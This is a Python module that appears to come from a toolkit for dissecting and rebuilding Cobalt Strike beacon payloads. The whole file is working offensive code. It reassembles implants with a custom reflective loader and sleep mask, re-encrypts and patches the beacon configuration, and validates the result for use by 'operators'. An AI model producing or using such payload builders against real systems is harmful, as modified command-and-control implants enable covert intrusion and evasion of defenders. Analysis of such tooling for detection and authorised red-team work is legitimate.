"""MOD_REASSEMBLER — Payload Reassembler & Modification Engine.

Performs version-aware payload reassembly from dissected components.
Enables operators to:
  - Replace the reflective loader stub with a custom UDRL
  - Inject/replace the sleep mask component
  - Modify and re-encrypt the configuration block
  - Validate the reassembled payload structure

Assembly order (version-aware):
  Loader Stub → Beacon DLL (with patched config) → Sleep Mask → Post-Ex DLLs

Each version schema defines the segment order, padding requirements,
and alignment rules for the target CS version.
"""

import logging
from typing import Any, Dict, List, Optional

from cs_aggregator.utils.errors import CSAggregatorError
from cs_aggregator.utils.hashing import compute_hashes
from cs_aggregator.utils.types import (
    Manifest,
    ReassemblyConfig,
    ReassemblyResult,
)

logger = logging.getLogger("cs_aggregator.reassembler")

# Alignment constants
PAGE_ALIGN = 0x1000  # 4KB page alignment for PE sections
DWORD_ALIGN = 0x4     # DWORD alignment for shellcode segments

# Default assembly order (CS 4.9+)
DEFAULT_ASSEMBLY_ORDER = [
    "SEG_LOADER_STUB",
    "SEG_BEACON_DLL",
    "SEG_SLEEP_MASK",
    "SEG_POSTEX_DLL",
]


class Reassembler:
    """Payload reassembler that constructs a valid beacon payload from components.

    Operates on the output of the dissect pipeline (Manifest). Takes a
    ReassemblyConfig describing which components to replace or modify.

    The reassembler is version-aware: it uses the version schema to determine
    the correct assembly order, padding requirements, and alignment rules.
    """

    def __init__(self, version_schema: Optional[Dict[str, Any]] = None):
        """Initialize with an optional version schema.

        Args:
            version_schema: Version schema with assembly rules,
                segment boundary hints, and PE expectations.
        """
        self.schema = version_schema or {}

    def reassemble(
        self,
        manifest: Manifest,
        config: ReassemblyConfig,
    ) -> ReassemblyResult:
        """Reassemble a beacon payload from dissected components with modifications.

        Args:
            manifest: The dissection manifest containing original segment info.
            config: The reassembly configuration specifying which components
                to replace or modify.

        Returns:
            ReassemblyResult with the reassembled payload and metadata.
        """
        result = ReassemblyResult()
        components_used: Dict[str, bool] = {
            "loader": False,
            "beacon_dll": False,
            "sleep_mask": False,
            "postex": False,
            "config_patched": False,
        }

        # Step 1: Determine which loader to use
        if config.custom_loader is not None:
            loader_bytes = config.custom_loader
            components_used["loader"] = True
            logger.info("Using custom UDRL loader (%d bytes)", len(loader_bytes))
        else:
            loader_bytes = b""
            result.warnings.append("No loader stub available — reassembling without loader")

        # Step 2: Determine beacon DLL and apply config modifications
        if config.modified_dll is not None:
            dll_bytes = config.modified_dll
            components_used["beacon_dll"] = True
            logger.info("Using modified beacon DLL (%d bytes)", len(dll_bytes))
        else:
            result.errors.append("No beacon DLL available — cannot reassemble without beacon")
            return result

        # Step 4: Apply config modification if requested
        if config.modified_config is not None and config.xor_key is not None:
            from cs_aggregator.modules.config_extractor import ConfigExtractor

            try:
                encrypted_config = ConfigExtractor.reencrypt_config(
                    config.modified_config, config.xor_key
                )
                dll_bytes = self._patch_config_in_dll(
                    dll_bytes, encrypted_config, manifest
                )
                components_used["config_patched"] = True
                logger.info(
                    "Config patched into beacon DLL (%d bytes encrypted)",
                    len(encrypted_config),
                )
            except Exception as e:
                result.warnings.append(f"Config patching failed: {e}")
        elif config.modified_config is not None and config.xor_key is None:
            result.warnings.append(
                "Config modification requested but no XOR key provided — "
                "use --xor-key or omit --with-config"
            )

        # Step 5: Determine sleep mask
        if config.custom_sleep_mask is not None:
            sleep_mask_bytes = config.custom_sleep_mask
            components_used["sleep_mask"] = True
            logger.info("Using custom sleep mask (%d bytes)", len(sleep_mask_bytes))
        else:
            sleep_mask_bytes = None

        # Step 6: Assemble everything in order
        try:
            payload = self._assemble_segments(
                loader_bytes=loader_bytes,
                dll_bytes=dll_bytes,
                sleep_mask_bytes=sleep_mask_bytes,
            )
        except Exception as e:
            result.errors.append(f"Segment assembly failed: {e}")
            return result

        # Step 7: Validate the reassembled payload
        validation_errors = self.validate_reassembly(payload, manifest)
        if validation_errors:
            result.warnings.extend(validation_errors)

        result.success = True
        result.payload = payload
        result.size = len(payload)
        result.sha256 = compute_hashes(payload)["sha256"]
        result.components_used = components_used

        logger.info(
            "Reassembly complete: %d bytes, %d components used, %d warnings",
            len(payload),
            sum(1 for v in components_used.values() if v),
            len(result.warnings),
        )
        return result

    def _assemble_segments(
        self,
        loader_bytes: bytes,
        dll_bytes: bytes,
        sleep_mask_bytes: Optional[bytes] = None,
    ) -> bytes:
        """Assemble all segments into a single payload blob.

        Assembly order: Loader Stub → Beacon DLL → Sleep Mask
        (Post-Ex DLLs are already embedded within the beacon DLL)

        Args:
            loader_bytes: The reflective loader stub bytes.
            dll_bytes: The beacon DLL bytes.
            sleep_mask_bytes: Optional sleep mask bytes.

        Returns:
            Complete reassembled payload bytes.
        """
        parts: List[bytes] = []

        # 1. Loader stub
        if loader_bytes:
            parts.append(loader_bytes)

        # 2. Beacon DLL
        if dll_bytes:
            parts.append(dll_bytes)

        # 3. Sleep mask (appended after DLL if not embedded in a PE section)
        if sleep_mask_bytes:
            # Align to DWORD boundary
            current_size = sum(len(p) for p in parts)
            padding = (DWORD_ALIGN - (current_size % DWORD_ALIGN)) % DWORD_ALIGN
            if padding:
                parts.append(b"\x00" * padding)
            parts.append(sleep_mask_bytes)

        return b"".join(parts)

    def _patch_config_in_dll(
        self,
        dll_bytes: bytes,
        encrypted_config: bytes,
        manifest: Manifest,
    ) -> bytes:
        """Patch re-encrypted config data into the beacon DLL.

        Locates the original config block offset from the manifest and
        replaces it with the new encrypted data. If sizes differ, uses
        null-padding to fill any gap.

        Args:
            dll_bytes: The beacon DLL bytes to patch.
            encrypted_config: The re-encrypted config block bytes.
            manifest: The dissection manifest (extracted segment info).

        Returns:
            Patched beacon DLL bytes.
        """
        # Find the config segment in the manifest
        config_offset = self._find_config_offset(manifest)
        if config_offset is None or config_offset >= len(dll_bytes):
            raise CSAggregatorError(
                f"Cannot find config block offset in manifest — patch failed"
            )

        # Check if the config sizes match
        original_size = len(encrypted_config)
        patched = bytearray(dll_bytes)

        # Replace bytes at the config offset
        end_offset = config_offset + original_size
        if end_offset <= len(patched):
            patched[config_offset:end_offset] = encrypted_config
        else:
            # Config block extends beyond current DLL — extend it
            patched[config_offset:] = encrypted_config

        return bytes(patched)

    def validate_reassembly(
        self,
        payload: bytes,
        manifest: Manifest,
    ) -> List[str]:
        """Validate the reassembled payload structure.

        Checks:
          - Payload is not empty
          - Contains valid MZ/PE headers
          - Size is within reasonable range for target version
          - Loader stub section has reasonable entropy

        Args:
            payload: The reassembled payload bytes.
            manifest: The original dissection manifest for reference.

        Returns:
            List of validation warnings (empty if all checks pass).
        """
        warnings: List[str] = []

        if not payload:
            warnings.append("Reassembled payload is empty")
            return warnings

        # Check minimum size
        if len(payload) < 512:
            warnings.append(
                f"Reassembled payload is suspiciously small ({len(payload)} bytes)"
            )

        # Check MZ header presence (should be within first 16KB)
        mz_pos = payload.find(b"MZ", 0, min(16384, len(payload)))
        if mz_pos == -1:
            warnings.append("No MZ header found in reassembled payload")
        elif mz_pos > 0:
            # Check that loader stub before MZ looks reasonable
            warnings.append(
                f"MZ header at offset {mz_pos} — loader stub area present"
            )

        # Check for multiple MZ headers (could indicate corruption)
        mz_count = payload.count(b"MZ")
        if mz_count > 3:
            warnings.append(
                f"Multiple MZ occurrences ({mz_count}) — payload may have overlapping segments"
            )

        # Check overall size against version expectations
        hints = self.schema.get("segmentBoundaryHints", {})
        max_size = hints.get("beaconDLLExpectedMaxSize", 512000) * 2
        if len(payload) > max_size:
            warnings.append(
                f"Reassembled payload ({len(payload)} bytes) exceeds expected "
                f"max size ({max_size}) for target version"
            )

        return warnings

    @staticmethod
    def _get_segment_bytes(
        segment_id: str,
        segments: List[Dict[str, Any]],
    ) -> Optional[bytes]:
        """Check if a segment exists in the manifest metadata.

        Note: This only checks metadata presence — actual payload bytes
        must be provided via ReassemblyConfig or build_from_original().
        Returns None because a manifest alone does not contain payload bytes.
        """
        # Manifest metadata only has offsets/sizes, not actual bytes.
        # Actual segment data must come from ReassemblyConfig fields
        # (custom_loader, modified_dll, custom_sleep_mask) or from
        # build_from_original() which extracts from the original payload.
        return None

    @staticmethod
    def build_from_original(
        original_payload: bytes,
        manifest: Manifest,
        config: ReassemblyConfig,
    ) -> "ReassemblyResult":
        """Reassemble a payload using the original payload buffer and manifest.

        Extracts original segments from the payload using manifest offsets
        and applies the reassembly config modifications.

        Args:
            original_payload: The original payload bytes.
            manifest: The dissection manifest for the original payload.
            config: The reassembly configuration.

        Returns:
            ReassemblyResult from the reassembly operation.
        """
        segments = manifest.segments

        # Extract original loader from payload using manifest offsets
        loader_data = None
        for seg in segments:
            if seg.get("segmentId") == "SEG_LOADER_STUB":
                offset = seg.get("offset", 0)
                size = seg.get("size", 0)
                if offset >= 0 and size > 0 and offset + size <= len(original_payload):
                    loader_data = original_payload[offset:offset + size]
                break

        # Extract original beacon DLL
        dll_data = None
        for seg in segments:
            if seg.get("segmentId") == "SEG_BEACON_DLL":
                offset = seg.get("offset", 0)
                pe_info = seg.get("peInfo", {})
                sections = pe_info.get("sections", [])
                if sections:
                    last_sec = sections[-1]
                    va_end = last_sec.get("virtualAddress", 0) + last_sec.get("rawSize", 0)
                    size = va_end
                else:
                    size = seg.get("size", len(original_payload) - offset)
                if offset >= 0 and offset + size <= len(original_payload):
                    dll_data = original_payload[offset:offset + size]
                break

        # Extract original sleep mask
        sleep_mask_data = None
        for seg in segments:
            if seg.get("segmentId") == "SEG_SLEEP_MASK":
                offset = seg.get("offset", -1)
                size = seg.get("size", 0)
                if offset >= 0 and size > 0 and offset + size <= len(original_payload):
                    sleep_mask_data = original_payload[offset:offset + size]
                break

        # Build effective config: use provided replacements, fall back to originals
        effective_config = ReassemblyConfig(
            custom_loader=config.custom_loader if config.custom_loader is not None else loader_data,
            modified_dll=config.modified_dll if config.modified_dll is not None else dll_data,
            custom_sleep_mask=config.custom_sleep_mask if config.custom_sleep_mask is not None else sleep_mask_data,
            modified_config=config.modified_config,
            xor_key=config.xor_key,
        )

        reassembler = Reassembler()
        result = reassembler.reassemble(manifest, effective_config)
        return result

    @staticmethod
    def _find_config_offset(manifest: Manifest) -> Optional[int]:
        """Find the config block offset in the manifest segments.

        Returns:
            The byte offset of the config block within the beacon DLL,
            or None if not found.
        """
        for seg in manifest.segments:
            if seg.get("segmentId") == "SEG_CONFIG_BLOCK":
                offset = seg.get("offset", -1)
                if offset >= 0:
                    return offset
        return None
